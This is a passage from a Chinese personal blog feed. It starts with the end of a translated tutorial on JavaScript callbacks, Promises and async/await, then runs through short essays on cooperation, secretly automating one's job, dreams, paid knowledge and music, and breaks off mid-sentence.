js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下为标准的回调地狱</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">combineFiles</span>(<span class="params">file1, file2, file3, printFileCallBack</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> newFileText = <span class="string">''</span></span><br><span class="line">    readFile(string1, (text) =&gt; &#123;</span><br><span class="line">        newFileText += text</span><br><span class="line">        readFile(string2, (text) =&gt; &#123;</span><br><span class="line">            newFileText += text</span><br><span class="line">            readFile(string3, (text) =&gt; &#123;</span><br><span class="line">                newFileText += text</span><br><span class="line">                printFileCallBack(newFileText)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码难以理解，这还是没有包括错误处理（比如其中一个文件不存在）的代码。</p><h1 id="我保证这会变好（你懂了？！）"><a href="#我保证这会变好（你懂了？！）" class="headerlink" title="我保证这会变好（你懂了？！）"></a>我保证这会变好（你懂了？！）</h1><p>*译者注：这里作者用了 Promise 的双关，既是‘保证’意，又是 Promise 关键字意。</p><p>这时 <code>Promise</code> 就派上用场了。Promise 是一种提前知晓暂未出现数据的方式。<a href="https://github.com/getify/You-Dont-Know-JS" target="_blank" rel="noopener">You Don’t Know JS 系列</a>的作者 Kyle Simpson 是知名的异步 JS 布道者。<a href="https://www.youtube.com/watch?v=Qg1SvpIau6U" target="_blank" rel="noopener">他对 Promise 的解释是</a>：就像在快餐店点餐。</p><ol><li>点餐。</li><li>付钱并取得餐号小票。</li><li>等餐。</li><li>当餐准备好了，他们会叫你的号。</li><li>取餐。</li></ol><p>正如他指出的，当你在等餐的时候不可能吃你的菜，但是你可以盼它，你可以为你的餐做好准备。当你等餐的时候你可以继续你的人生，即使现在没有拿到菜，因为食物已经被“允诺”给你了。这就是 Promise。一个用于表示终将出现数据的对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">readFile(file1)</span><br><span class="line">  .then(<span class="function">(<span class="params">file1-data</span>) =&gt;</span> &#123; <span class="comment">/* do something */</span> &#125;)</span><br><span class="line">  .then(<span class="function">(<span class="params">previous-promise-data</span>) =&gt;</span> &#123; <span class="comment">/* do the next thing */</span> &#125;)</span><br><span class="line">  .catch( <span class="comment">/* handle errors */</span> )</span><br></pre></td></tr></table></figure><p>这是 <code>Promise</code> 的语法。就主要好在可以用直观的方式链接顺序事件。上面的例子看上去还不错，但是我们还是在使用回调函数。Promise 只是把回调简单包装了一下，让它更直观了。</p><h1 id="最好（且最新）的方式：-Async-／-Await"><a href="#最好（且最新）的方式：-Async-／-Await" class="headerlink" title="最好（且最新）的方式： Async ／ Await"></a>最好（且最新）的方式： Async ／ Await</h1><p>几年前，async 函数被纳入了 JavaScript 生态系统。截止上个月已作为一种官方语法得到了广泛的支持。</p><p><code>async</code> 和 <code>await</code> 关键字基于 pormise 和 generator 做了简单的封装。本质上，它允许我们在所需的任意位置使用 <code>await</code> 关键字“暂停”一个函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">logger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 获取到值之前都会暂停</span></span><br><span class="line">  <span class="keyword">let</span> data = <span class="keyword">await</span> fetch(<span class="string">'http://sampleapi.com/posts'</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码能按照你想象的运行。它记录来自 API 调用的数据。如果这都看不懂我也不知道咋办了。</p><p>这样做的好处就是直观。 你以大脑思考的方式编写代码，然后告诉代码在所需的位置暂停。</p><p>另一个好处就是可以使用 promise 不能使用的 <code>try</code> 和 <code>catch</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">logger</span> (<span class="params"></span>)  </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> user_id = <span class="keyword">await</span> fetch(<span class="string">'/api/users/username'</span>)</span><br><span class="line">        <span class="keyword">let</span> posts = <span class="keyword">await</span> fetch(<span class="string">'/api/`$&#123;user_id&#125;`'</span>)</span><br><span class="line">        <span class="keyword">let</span> object = <span class="built_in">JSON</span>.parse(user.posts.toString())</span><br><span class="line">        <span class="built_in">console</span>.log(posts)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'Error:'</span>, error) </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是个故意构造的例子，但至少证明了一点： <code>catch</code> 可以捕获在该过程中发生的任意错误。至少有三个位置 <code>try</code> 可能出错，这也是迄今为止处理一部代码最简洁的方式。</p><p>我们也可以使用 async 函数让循环和判断不再令人头疼：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> counter = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">        <span class="built_in">console</span>.log(counter)</span><br><span class="line">        <span class="keyword">await</span> sleep(<span class="number">1000</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是一个愚蠢的例子，但至少会按照预期运行并且容易阅读。 如果您在控制台中运行此操作，你会看到代码在调用 sleep 的时候暂停，下一个循环也不会等一秒钟再启动。</p><h1 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h1><p>现在你领略了 <code>async</code> 和 <code>await</code> 的美，让我们深入了解它的细节：</p><ul><li><code>async</code> 和 <code>await</code> 基于 <code>promise</code>。 使用 <code>async</code> 的函数将始终返回一个 promise 对象。 这一点很重要，你有可能会陷入一种“我懂了”的假象。</li><li>在使用 <code>await</code> 的时候我们暂停了函数，而非整段代码。</li><li><code>async</code> 和 <code>await</code> 是非阻塞的。</li><li><p>你仍然可以使用 <code>Promise</code> 例如 <code>Promise.all()</code>，这是我们之前的代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">logPosts</span> (<span class="params"></span>)  </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> user_id = <span class="keyword">await</span> fetch(<span class="string">'/api/users/username'</span>)</span><br><span class="line">        <span class="keyword">let</span> post_ids = <span class="keyword">await</span> fetch(<span class="string">'/api/posts/&lt;code&gt;$&#123;user_id&#125;'</span>)</span><br><span class="line">        <span class="keyword">let</span> promises = post_ids.map(<span class="function"><span class="params">post_id</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span>  fetch(<span class="string">'/api/posts/$&#123;post_id&#125;'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> posts = <span class="keyword">await</span> <span class="built_in">Promise</span>.all(promises)</span><br><span class="line">        <span class="built_in">console</span>.log(posts)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">        <span class="built_in">console</span>.error(<span class="string">'Error:'</span>, error) </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>await</code> 只能在已被声明为 <code>async</code> 的函数内使用。</p></li><li>所以不能在全局使用 <code>await</code>。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 抛出异常</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logger</span> (<span class="params">callBack</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">await</span> callBack)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对了!</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">logger</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">await</span> callBack)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="现在就可以用啦"><a href="#现在就可以用啦" class="headerlink" title="现在就可以用啦"></a>现在就可以用啦</h1><p>截至2017年6月，几乎所有浏览器都可以使用 <code>async</code> 和 <code>await</code> 关键字。更好的是，为了确保您的代码在任何地方都可以工作，请使用 Babel 将 JS 预处理为旧版本支持的语法。</p><p>如果您对 ES2017 的更多内容感兴趣，可以<a href="http://2ality.com/2016/02/ecmascript-2017.html" target="_blank" rel="noopener">在这里查看完整的 ES2017 功能列表</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 疑似机器人 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>完全配合</title>
      <link href="/2017/08-09-fully-cooperate/"/>
      <url>/2017/08-09-fully-cooperate/</url>
      
        <content type="html"><![CDATA[<blockquote><p>语言处理器会事无巨细地做错误检查并指出。这和人打交道不同，只要你方便，它总是有足够的时间和耐心陪你一起。</p></blockquote><p>我感觉我对人更没有耐心，或许是因为机器不会对我的情绪化表现作出反应，在与人社交时我会很容易地展现出自己的不耐烦，对亲密的人尤甚。<br>与调试不同，社交并不会为你作任何保证。社交中的几乎所有结果都不是某一方决定的，对一个对待风险更加保守的人来说，交友不如赌老虎机。毕竟老虎机对于所有人都是随机的。<br>你只用拉下摇杆等着 777，老虎机不会让你更失望的，没有哪种老虎机会吃掉你尚未投进去的代币。  </p><p>这可能就是为什么我有时候更乐于做一个 API，在社交中完全配合。你告诉我时间和地点，我给你我所知的天气预报。<br>这样的话，至少不会让对方出乎意料地失望。做到完全配合又是多么简单的一件事情，我不用考虑你说了什么、有什么寓意、有什么期望、有什么不满，我只管去做；你不能责怪我做错了什么，因为并不是我给不了你完美的结果，而是你当初提出了错误的要求。</p><p>要是人人都像这样，太空时代会不会来的更早一点？</p><p>但是这样看来完全配合又是极不负责、极没有耐心的。看似在配合的过程中不对输入做任何评价，然而这种「我不服，走着瞧，等打脸」的方式却相当的低效且暴力。完全配合放弃了与人沟通的优势，又显得有些无力了。</p><p>所以到头来其实并不是机器对我有耐心所以我更喜欢与机器打交道，而是我没有足够的耐心与人打交道不愿意社交，而已。</p><p>就是这样～</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>将自己的工作偷偷自动化道德么？</title>
      <link href="/2017/07-09-automatic/"/>
      <url>/2017/07-09-automatic/</url>
      
        <content type="html"><![CDATA[<p>具体的事件可以看看<a href="http://blog.jobbole.com/111742/" target="_blank" rel="noopener">这一篇文章</a>。<br>简单来说就是一个远程工作的员工，将一个月要做的事自动化到一个小时了。为了不让人发现，程序还有故意出错的功能。由于工资高，自由时间多，他并没有把自动化的事情告诉他的老板。这样几乎没有劳动的拿了六个月工资后，他开始质疑自己的行为是否道德了。</p><p>人的代入感可能会很强，作为当事人肯定不愿意丢掉这个好工作，那么忍受自己良心的责备，可能会让他对自己进行辩护；作为他的同事或者是老板，可能就会质疑他拿这些钱的本事值不值得高薪和自由时间充裕了。我倒是这个事情要从两个方面看，一个是自动化，一个是不告诉老板。不要只看到人家不做事又拿高薪还闲的慌。</p><p>步入文明社会，就肯定会有机械来取代人工（解放生产力）。纺织工人、马车车夫、告诉公路收费人员、再到这个小哥。自动化是一件好事，<a href="https://www.zhihu.com/question/24138410" target="_blank" rel="noopener">大快人心的大好事</a>，把相对低复杂度的重复劳动给包装起来再放入<a href="https://www.zhihu.com/question/46747673" target="_blank" rel="noopener">透明的黑盒</a>。</p><p>可以这样说，如果设计得当的话，<strong>自动化就是富含经验的仙丹。</strong></p><p>现代人如果要掌握一门技术从头到尾的具体实现，那么花费的时间是以年来计算的。这句话说的时候离第一次工业革命才二百来年，这样想一想未来的某一天，如果有一个人想要掌握一门技术从头到尾的具体实现，那可能穷尽一生都不可能完成。</p><p>就比如2777年的宇宙飞船驾驶员面试题“<a href="http://ipn.li/kernelpanic/39/" target="_blank" rel="noopener">从按下发射按钮到飞船到达M78星云都具体发生了什么？</a>”，要完美回答这样的问题可能需要一个人花费一生来学习，这个时候生命的长度上限就限制了人类的进步了。必须要把经验给黑盒化，我不需要知道飞船是如何开动的，飞船设计的时候给了我足够多的按钮／接口，作为一个民用飞船驾驶员，我只需要会用就行了。</p><p>可能我永远不可能质疑自动化道不道德。毕竟人家是凭本事在搞自动化。</p><p>但是不告诉老板却是不道德的，作为老板肯定对他的行为有知情权，更别说这人写的自动化脚本居然还有自动加bug的功能（太棒了！），在我看来这可能就属于诈骗了，正如讨论中说到的：</p><blockquote><p>你还要让创建表格的分析师花费相当多的时间来检查你的工作</p></blockquote><p>这就不仅仅是自己的事，还连累到别人的工作（创造就业机会），这是万万不可的。</p><p>文明进步在某种程度上来说是懒惰推动的，而不是欺骗和隐瞒。</p><p>就是这样～</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>我想要什么</title>
      <link href="/2017/05-05-whatiwanttoday/"/>
      <url>/2017/05-05-whatiwanttoday/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" src="//music.163.com/outchain/player?type=2&id=31010857&auto=1&height=66"></iframe><p>今天和大家说到这个话题的时候我还有点惊讶，自己居然没有一个准备好的答案。</p><p>如果突然问我，我应该会回答‘钱’，因为钱是通货。和电能一样，大多数能量都可以转化成电能；电能也可以转化为其他能量。</p><h2 id="梦想"><a href="#梦想" class="headerlink" title="梦想"></a>梦想</h2><p>思老师说他的梦想是当地铁导流员，他小时候羡慕地铁导流员每天上班能看到形形色色的人。</p><p>他现在的条件完全允许他无痛迁徙到地铁导流这份工作上，但是他并没有直接辞职，而是选择保留这个梦想，继续在我司工作。</p><p>我想可能思老师一辈子都不会去当地铁导流，这个梦在他这里就是个梦，而已。可能在拥有无痛迁徙的能力之后，这个梦想对他的吸引力就不如以前了。既然随时都可以辞职去完成自己的梦想，那还是不要改变，继续走。</p><p>私以为，实现梦想的道路并不是直达的：由于对自己的要求、对机遇的把控，很多人终其一生都不会圆梦。斯老师这种就属于超额完成了。让一个人，尤其是超额完成的这批人突然从一个轨道更换到另一个轨道是需要很大勇气的。</p><p>思老师自己说的，由于家庭的影响，他需要不会挨饿的安全感，所以才继续上班，而不是去当导流。我遇见很多人都是追求安稳的，现今的环境会引导人们去追求安稳。比如买房成家、比如小鸡长大了就变成了鹅；鹅长大了，就变成了羊；羊再长大了，就变成了牛；等牛长大了，共产主义就到了。</p><h2 id="YOLO"><a href="#YOLO" class="headerlink" title="YOLO"></a>YOLO</h2><p>我同意说，成长的环境很大程度上决定了一个人的核心部分：这里指的既是三观，也是 ‘follow your heart’ 的 ‘heart’。这些核心部分在 ’people sure change’ 的过程中是很难改变的，很有可能会伴随这个人一生。那么是否应该在成长的环境中给人以尽量大的自由，将这个人的一生尽可能的交给他自己来决策呢？</p><p>我希望在我老的时候，不会因为自己没有做过某事、再也无法尝试而追悔。我可以锻炼我的心智，让我在那个时候不再在意没有做过的事，让我在那个时候不再追悔。当然也可以选择尽可能的做，将这些作为酒后的谈资。</p><p><img src="./whiplash.png" alt=""></p><p>所以说需要锻炼肉体和精神的强健呢，我想我已经对精神的强健有了一定的概念了。</p><p>睡觉了。要活着。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>缺觉</title>
      <link href="/2017/03-22-lackofsleep/"/>
      <url>/2017/03-22-lackofsleep/</url>
      
        <content type="html"><![CDATA[<p>自从这个月初租到房子，从学校搬出来之后，我的生活发生了翻天覆地的变化。<br>我希望我能勉强活下去，不至于流落街头。<br>为了达到这个目标，我要努力学习，增加自己的能力以及素质才是。<br>不能输啊。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>荷尔蒙作品</title>
      <link href="/2017/02-23-whatsup20170223/"/>
      <url>/2017/02-23-whatsup20170223/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=17455810&auto=1&height=66"></iframe><h2 id="原则-基石-北极星"><a href="#原则-基石-北极星" class="headerlink" title="原则/基石/北极星"></a>原则/基石/北极星</h2><p>最近越发感觉原则的重要性，这里要说的更多是精神指标而非目的，比起导航来说更像北极星。<br>原则这东西就跟神奇海螺一样有问必答，在任何困惑的时候都可以往原则上靠以快速做出抉择。<br>以维基百科为例：</p><blockquote><p>维基百科的基础准则可以总结为五大支柱：<br>维基百科是一部百科全书<br>维基百科采用中立观点<br>维基百科是版权开放的<br>维基人以礼相待、相互尊重<br>维基百科不墨守成规</p></blockquote><p>这五点使维基百科与其他互联网百科区分开来，成为一个值得尊敬的整体。<br>然而这五点并不是在维基百科建立之后再总结出来的。要在刚开始的时候对整体精神有一个统筹，常人怕是很难做到。这也是为何计算机之父永远是计算机之父，你大爷终究是你大爷。<br>与做人的原则一样，这种原则应该是种一以贯之的东西。要在人生刚开始的时候就对整体精神有一个统筹，那么我想就真的是活出彩了。希望当我临终的时候回头望，也能发现自己一两点原则从未改变吧。</p><h2 id="我对知识付费的看法"><a href="#我对知识付费的看法" class="headerlink" title="我对知识付费的看法"></a>我对知识付费的看法</h2><p>小密圈，知乎Live，得到。互联网知识付费是有违互联网本质的，知识本应是共享的，然而在他们这儿免费用户和付费用户得到的东西确定了就不一样。<br>说白了就是吃相难看，太难看。内容优秀对我有价值我自然会支持。你想要钱可以，但是我不给你不能抢。<br>暴雪的游戏都有相应的付费模式，游戏中金钱可以节约时间，当然不花钱也要付出对应的时间。有没有付费不重要，努力的玩家与付费玩家并无本质差别。<br>但是互联网知识付费是否是关闭了努力者上升的道路？<br>我怕一种感觉自己得到了的错觉。付费让人感觉良好，自己为所谓的努力付出了金钱的代价，当然有部分人也仅止步于此。<br>这种错觉并不是完全有害，毕竟自信是某些人所渴望的，但是如果很多人都处于错觉带来的自信当中，那么进步就无从谈起了。<br>又想起我司组内选题会时与大家的分歧了，我当时希望的是给用户这种错觉，以达到赚钱的目的；大佬希望的是教书育人，顺便把钱赚了。<br>我想可能有很多用户，包括我自己都会吃这一套吧：为错觉付费。<br>现在想想，kindle 其实和这种东西有可能是同一种套路呢~</p><hr><p>好久没有写了，感觉很难憋出字来。。。<br>好好想，好好写。<br>点到为止。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>随笔一则</title>
      <link href="/2017/01-15-whatsup20170115/"/>
      <url>/2017/01-15-whatsup20170115/</url>
      
        <content type="html"><![CDATA[<p>今年的第一篇，那么新年的愿望就是这一篇不会是最后一篇。</p><h2 id="向。。。低头"><a href="#向。。。低头" class="headerlink" title="向。。。低头"></a>向。。。低头</h2><p>如果说最近学到了什么人生的经验，那么就是「我错了」。<br>我发现自己还是涉世未深，几乎对所有事物都是青勾子娃儿，常常犯错。<br>与写代码时检查自己一样，人际交往中，「我错了」可以发现问题，进而达到最终目的————解决问题。<br>即使羞于承认，但事实的的确确就是这样，自己总会出错的。</p><p>最近的对项目的提交很是频繁，几乎到了一种只要有 commit 就想交给后端上线的程度。<br>然而人员不像是编译器，出错了便提示你，他们除此之外总会有带有情绪。<br>一方面是频繁提交是一种重复劳动，所有程序员都不想做这样的事情。<br>另一方面是改动带来的不稳定因素预示着将来修改时的劳动时间，这是一种<strong>必然的未知</strong>，必然指必然发生，未知指未知工作量，人们不希望这样的东西干扰他们。</p><blockquote><p>提交代码时不仅提交了改动，起码还有一份对代码的尊重。</p></blockquote><p>以上是工作方面。</p><p>然后是人。<br>人总是会变的，据说离婚的首要原因是，妻子越发感觉婚后的丈夫失去野心。<br>People sure change，那么如何将我的下半生与一个会变的人分享，这个问题就十分有趣了，这也是一种<strong>必然的未知</strong>。<br>我想的话，解决方案应该是勇于承认自己的陈见，动态的评价吧。<br>至于动态评价的标准，就应该是经得起时间考验的、终极的奥义，例如「peace and love」。<br>所以我感觉我还是需要给所有事物一些机会，包括又不仅限于人、行为、作品、软件。<br>行动的第一步就是屏蔽的所有人，手边认为难看的书，等等。<br>或许这是给我将来重新安装网易云音乐一个借口？<br>————不知道这个梗的可以看<a href="http://gaoryrt.com/2016/08-22-shut-up-n-listen/">今天删了网易云音乐</a></p><h2 id="今天纹身了"><a href="#今天纹身了" class="headerlink" title="今天纹身了"></a>今天纹身了</h2><p>另，今天（2017年01月15日），我有了人生中的第一个纹身。<br>暂时不知道对我有什么影响，以后详说。这也是一种<strong>必然的未知</strong>。</p><h2 id="服务与创造"><a href="#服务与创造" class="headerlink" title="服务与创造"></a>服务与创造</h2><p>在某方面来说，服务处于创造的对立面。<br>大家觉得自己买的是服务，而非内容。写书就可以想写就写，爱看不看。但是到了餐厅就不是这样了。<br>毋庸置疑的，写书是创造，餐饮是服务。<br>对比二者发现：写书的需要做到不收流行影响，餐饮却要做到迎合流行。<br>写书的需要将「人」的因素加进去，而餐饮则需尽量将其排除。<br>另外，某些理发师认为自己是创造者，然而在使用方看来则是服务者，这可能也是为什么我们经常黑总监 Tony 了。</p><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>What&#39;s Up These Days</title>
      <link href="/2016/11-25-whatsup161125/"/>
      <url>/2016/11-25-whatsup161125/</url>
      
        <content type="html"><![CDATA[<p>The reason why this article is written in English is that I’m using vim which is not chinese-display friendly.</p><p>The reason why I’m using vim is that vim is my only choice in a ssh.</p><p>And ssh is the easiest way I can imagine to connect to my computer’s shell.</p><h2 id="so-what’s-up"><a href="#so-what’s-up" class="headerlink" title="so, what’s up?"></a>so, what’s up?</h2><p>Well, people change, things go wrong, shit happens but life goes on.<br>I’m still working out every one or two days. I like this full-body-controll thingy.<br>No more youtube channel, no more WestWorld. The latest episode is unwatched.<br>Today, i got a money support because of my personal open-source project, this guy likes it.<br>And today, I saw my colleague forwarding an advertisment of job offer in his Wechat moments, and this job offer discribed what should I do for work.<br>My poor English can not discribe how I feel.</p><h2 id="um…"><a href="#um…" class="headerlink" title="um…"></a>um…</h2><p>gather ye rosebuds while ye may<br>yesterday’s still a flying<br>and same flower that smils today<br>tomorrow will be dying</p><p>that’s all for these days</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>好久没有听到抓耳朵的歌了</title>
      <link href="/2016/11-13-glitch/"/>
      <url>/2016/11-13-glitch/</url>
      
        <content type="html"><![CDATA[<p>以下内容包含个人喜好，而且想到哪里写到哪里。想看的看，不想看就别看。</p><p>前几天上班的时候突发奇想又把 <a href="https://en.wikipedia.org/wiki/The_Glitch_Mob" target="_blank" rel="noopener">the glitch mob</a> 的歌翻出来听，第一次接触这个电子乐队还是当年看过一个 eva 的 MAD，BGM 用的 <a href="https://soundcloud.com/theglitchmob/drive-it-like-you-stole-it" target="_blank" rel="noopener">drive it like you stole it</a>，个人感觉视频剪辑搭配也近乎完美，有兴趣的可以看看，等会儿找到链接我给放最后。<br>另外他们还有一首比较出名的：</p><blockquote><p>Their remix for “Seven Nation Army” by The White Stripes was featured in the trailer for the World War I first-person shooter, Battlefield 1.</p></blockquote><iframe width="100%" height="166" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/10240918&amp;color=ff5500&amp;auto_play=false&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false"></iframe><p>这首貌似很早之前就是拜仁的主场音乐了，好像我还在骑士主场听到过，对的就是 NBA 那个骑士。</p><p>最近喜欢下面这一首，可能是最近偏好 chill：</p><iframe width="100%" height="166" scrolling="no" frameborder="no" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/17958158&amp;color=ff5500&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false"></iframe><p>上一次 the glitch mob 出新专辑我记得还是一年前的<a href="https://soundcloud.com/theglitchmob/sets/the-glitch-mob-love-death-immortality" target="_blank" rel="noopener">那张武士脑壳</a>吧。看名字没有一首影响深刻的，但是最近听来每一首都还挺熟悉的，可能这就是我说的<code>抓耳朵</code>不见了。不像是 <code>seven nation army</code> 或者是 <code>drive it like you stole it</code> 或者是 <code>we can make the world stop</code> 或者是 <code>monday</code> 或者是 <code>bad wings</code>。</p><p><img src="https://i.ytimg.com/vi/LBZ-3Ugj1AQ/maxresdefault.jpg" alt="Love Death Immortality"></p><p>感觉还是 <a href="https://soundcloud.com/theglitchmob/sets/drink-the-sea" target="_blank" rel="noopener">drink the sea</a> 这一张厉害得多，无论是原专辑，还是两张 remix。</p><p>又想起来 <a href="https://www.youtube.com/channel/UC8nidfOKkcgpO6tfc9OSdBQ" target="_blank" rel="noopener">OWSLA</a> 的 Rip N Dip，出了个歌还将将就就，非要搞个 MV 去捧 <a href="https://en.wikipedia.org/wiki/Vaporwave" target="_blank" rel="noopener">vaporwave</a> 的臭脚，视频放在下面，自己看。明明跟复古毛的关系都没有，非要搞点滤镜，加个 8 bit 的 game over 上去。实在不行放<a href="https://www.youtube.com/user/OWSLAofficial/videos" target="_blank" rel="noopener">反光的马在沙漠里转圈圈</a>也行啊，追个什么 retro 风？ 实话讲，OWSLA 的风格向来就奇葩，私以为花时间在探索上是好的，但是捧臭脚就是牛屎。</p><iframe width="560" height="315" src="https://www.youtube.com/embed/2YllipGl2Is" frameborder="0" allowfullscreen></iframe><p>歌还是不错的，就是 mv 恶心，我到现在都能想到拍的时候几个人吃汉堡装作那样子多尴尬。</p><p>快了快了，十一月十八号 Justice 的 woman 就全出来了，到时候再看<del>你球电子乐有没有救</del> 。</p><p>另，drive it like you stole it 的 MAD：</p><iframe width="560" height="315" src="https://www.youtube.com/embed/qpaC4QuVKMk" frameborder="0" allowfullscreen></iframe><p>真的厉害。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔与个人文集 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Emotion</title>
      <link href="/2016/10-27-emotion/"/>
      <url>/2016/10-27-emotion/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="260" height="86" src="http://music.163.com/outchain/player?type=2&id=17455824&auto=1&height=66"></iframe><p>在大学的后两年，我渐渐不再掩盖自己的负面情绪了。在朋友面前毫无保留的展示自己的坏心思、表达对某个人的厌恶情感。我的内心总有个声音在给我说这是不对的，但是我的感觉却又告诉我这如此美妙。</p><p>我想把精美的事物毁坏给人看，想破坏某些优雅的东西。上一次有这种想法还是高三的时候，当时和最好的朋友下了晚自习，走到了少人的巷子里，我也悄悄向他说过类似的话。他当时给我的回复好像是，想什么就去做吧。然后我却没有去毁坏事物，这事现在让我庆幸又后悔，我在那个年纪并没有干出点那个年纪典型的事情来。我多么想在那个时候活得傻逼一点，现在我哪里有什么事情可以当做饭桌上的谈资呢？</p><p>我要是一个女生，我想我不会喜欢上现在的我这样的人的。可能是我也觉得自己太瘦了。我要努力长胖，等我一百四了之后我要去买一双aj，还要去纹身。纹 Don’t Panic，对就是 42 的那个 Don’t 